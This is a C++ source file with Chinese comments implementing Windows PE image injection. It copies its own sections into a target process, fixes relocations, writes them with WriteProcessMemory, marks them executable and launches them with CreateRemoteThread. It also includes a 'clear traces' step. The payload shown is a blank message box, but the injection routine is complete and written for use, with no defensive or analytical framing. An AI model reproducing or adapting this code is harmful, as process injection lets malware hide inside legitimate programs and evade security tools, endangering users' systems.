#include <iostream>
#include <windows.h>

/*
* 1.C/C++
* 常规: SDL检查(否)
* 优化: 优化(已禁用)
* 代码生成: 运行库(多线程)、安全检查(禁用安全检查)
* 2.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
*/

using namespace std;

// 核心功能
void MyMessageBox() {
    char text[] = { '\0' };
    MessageBoxA(0, text, text, MB_ICONINFORMATION);
}

#pragma code_seg(".shell")

// 导入 Sections 所需的 DLL
void ImportDll(char* importDllNames) {
    while (1) {
        char* importDllName = importDllNames;
        int importDllNameLength = strlen(importDllName);
        if (!importDllNameLength) {
            break;
        }
        LoadLibraryA(importDllName);
        importDllNames += importDllNameLength + 1;
    }

    // 调用核心功能
    MyMessageBox();
}

#pragma code_seg(".text")

int main() {
    // 目标进程 PID
    int pid = 123;

    // 当前进程基址
    DWORD_PTR currentImageBase = (DWORD_PTR)GetModuleHandle(NULL);

    // PE 结构信息
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)currentImageBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(currentImageBase + pDos->e_lfanew);
    DWORD_PTR imageBase = pNt->OptionalHeader.ImageBase;
    DWORD sizeOfImage = pNt->OptionalHeader.SizeOfImage;
    DWORD sizeOfHeaders = pNt->OptionalHeader.SizeOfHeaders;
    DWORD sizeOfSections = sizeOfImage - sizeOfHeaders;
    DWORD importDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[1]))->VirtualAddress;
    DWORD relocDirRVA = ((PIMAGE_DATA_DIRECTORY) & (pNt->OptionalHeader.DataDirectory[5]))->VirtualAddress;

    // 构造要注入的 Sections
    PVOID pInjectSections = malloc(sizeOfSections);
    memcpy(pInjectSections, (PVOID)(currentImageBase + sizeOfHeaders), sizeOfSections);

    // 遍历导入表 (收集全部 DLL 名称)
    char importDllNames[1000] = "";
    int importDllNamesLength = -1;
    PIMAGE_IMPORT_DESCRIPTOR pImportDir = (PIMAGE_IMPORT_DESCRIPTOR)(currentImageBase + importDirRVA);
    while (pImportDir->FirstThunk) {
        char* importDllName = (char*)(currentImageBase + pImportDir->Name);
        strncat_s(importDllNames + importDllNamesLength + 1, sizeof(importDllNames) - importDllNamesLength - 1, importDllName, strlen(importDllName) + 1);
        importDllNamesLength += strlen(importDllName) + 1;
        pImportDir++;
    }
    importDllNamesLength += 2; // kernel32.dll\0user32.dll\0\0

    // 目标进程句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    // 申请注入空间
    PVOID pSections = VirtualAllocEx(hProcess, NULL, sizeOfSections + importDllNamesLength, MEM_COMMIT, PAGE_READWRITE);

    // 地址重定位 (根据“注入空间”基址对 Sections 重定位)
    PIMAGE_BASE_RELOCATION pRelocDir = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pInjectSections - sizeOfHeaders + relocDirRVA);
    while (pRelocDir->SizeOfBlock) {
        PWORD pOffset = (PWORD)((DWORD_PTR)pRelocDir + sizeof(IMAGE_BASE_RELOCATION));
        int offsetNum = (pRelocDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        for (int i = 0; i < offsetNum; i++) {
            if (pOffset[i] >> 12 == IMAGE_REL_BASED_HIGHLOW || pOffset[i] >> 12 == IMAGE_REL_BASED_DIR64) {
                *(PDWORD_PTR)((DWORD_PTR)pInjectSections - sizeOfHeaders + pRelocDir->VirtualAddress + (pOffset[i] & 0xFFF)) += (DWORD_PTR)pSections - sizeOfHeaders - imageBase;
            }
        }
        pRelocDir = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocDir + pRelocDir->SizeOfBlock);
    }

    // 注入 Sections
    WriteProcessMemory(hProcess, pSections, pInjectSections, sizeOfSections, NULL);
    // 注入全部 DLL 名称
    WriteProcessMemory(hProcess, (PVOID)((DWORD_PTR)pSections + sizeOfSections), importDllNames, importDllNamesLength, NULL);

    // 修改注入空间的内存属性
    DWORD oldProtect;
    VirtualProtectEx(hProcess, pSections, sizeOfSections, PAGE_EXECUTE_READ, &oldProtect);

    // 创建远程线程调用 .shell 段的 ImportDll 函数，使目标进程导入 Sections 所需的 DLL
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)pSections - sizeOfHeaders + 0x11000), (PVOID)((DWORD_PTR)pSections + sizeOfSections), 0, NULL);

    // 清除痕迹
    memset(pInjectSections, 0, sizeOfSections);
    free(pInjectSections);

    // 防止 ImportDll 函数被优化消失
    while (1);
    ImportDll(NULL);
}